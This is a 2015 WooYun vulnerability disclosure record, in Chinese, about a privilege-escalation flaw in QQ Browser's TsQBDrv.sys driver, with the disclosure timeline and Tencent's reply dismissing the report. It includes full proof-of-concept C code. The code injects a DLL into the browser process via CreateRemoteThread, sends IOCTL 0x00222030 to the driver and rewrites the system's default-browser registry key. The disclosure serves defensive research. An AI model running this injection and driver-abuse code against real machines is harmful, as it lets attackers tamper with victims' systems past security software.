{"id": 24034, "wybug_id": "wooyun-2015-0104359", "wybug_title": "QQ浏览器某驱动提权漏洞", "wybug_corp": "腾讯", "wybug_author": "路人甲", "wybug_date": "2015-03-28 10:06", "wybug_open_date": "2015-06-28 15:15", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向公众公开  简要描述： TsQBDrv.sys对调用者的调用路径没有检查，被恶意利用后，会以内核模式将系统默认浏览器修改为任意程序，由于是内核模式修改注册表，能够绕过系统的所有安全限制，包括安全软件的防御，都会被突破，无论xp、win7都是如此，即使当前用户是user权限，也一样。 详细说明：  TsQBDrv.sys既不验证打开设备的用户是否具备管理员权限，也不对调用栈的合法性进行检查，使用硬代码将当前线程KTHREAD的PreviousMode改为KernelMode，帮助恶意调用者提权。存在问题的代码段：\n\n\n\n触发后效果：\n\n   漏洞证明：  \nexe代码：int main(int argc, _TCHAR* argv[]){\tHANDLE hToken = NULL;\tif(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))\t{\t\tTOKEN_PRIVILEGES* pTP = (TOKEN_PRIVILEGES*)malloc(0x100);\t\tif(pTP)\t\t{\t\t\tLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &(pTP->Privileges[0].Luid));\t\t\tpTP->PrivilegeCount = 1;\t\t\tpTP->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\t\tAdjustTokenPrivileges(hToken, FALSE, pTP, 0, NULL, NULL);\t\t\tfree(pTP);\t\t}\t\tCloseHandle(hToken);\t}\tHWND hwnd = FindWindow(_T(\"QQBrowserMainFrame\"), NULL);\tDWORD dwPid = 0;\tGetWindowThreadProcessId(hwnd, &dwPid);\tHANDLE process = OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD, FALSE, dwPid);\tCHAR* pDll = (CHAR*)VirtualAllocEx(process, NULL, 100, MEM_COMMIT, PAGE_READWRITE);\tCHAR* name = \"c:\\\\proc.dll\";\tDWORD dwReturned = 0;\tWriteProcessMemory(process, (LPVOID)pDll, (LPVOID)name, strlen(name)+1, &dwReturned);\tDWORD tid = 0;\tCreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)(DWORD)LoadLibraryA,\t\t(LPVOID)pDll, 0, &tid);\treturn 0;}dll代码：void Fuzz2(HANDLE hDev){\tDWORD dwReturned = 0;\tchar input[0x1000] = { 0 };\tchar output[4] = { 0 };\tDWORD d = 1;\tmemcpy(input, &d, 4);\tDeviceIoControl(hDev,\t\t0x00222030,\t\t(LPVOID)input,\t\t4,\t\t(LPVOID)output,\t\t4,\t\t&dwReturned,\t\tNULL);\tLPCTSTR p = _T(\"C:\\\\WINDOWS\\\\SYSTEM32\\\\NOTEPAD.EXE\");\tSHSetValue(HKEY_CLASSES_ROOT, _T(\"http\\\\shell\\\\open\\\\command\"),\t\tNULL, REG_SZ, (LPCVOID)p, (_tcslen(p) + 1)*sizeof(TCHAR));}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\{2E46F324-829A-4d67-A552-8FC694D6617E}\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif( (HANDLE)-1 != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}BOOL DllMain( HMODULE hModule,\t\t\t DWORD  ul_reason_for_call,\t\t\t LPVOID lpReserved\t\t\t ){\tif (DLL_PROCESS_ATTACH == ul_reason_for_call)\t{\t\tFuzz1();\t}\treturn TRUE;}\n   修复方案：  1.驱动对调用者的代码调用路径进行更为严格的检查；2.驱动不要帮助应用层提权；   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-28 15:15 厂商回复： 非常感谢您的报告，经评估该问题并不存在，故此忽略。白帽子提供的demo是注入QQ浏览器进程，然后以QQ浏览器的身份调用驱动，并不是驱动没有身份验证。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-30 20:48 |    \t\talvin \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:21        | 我的QQ：1114112873)\t\t \n  这样好吗？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}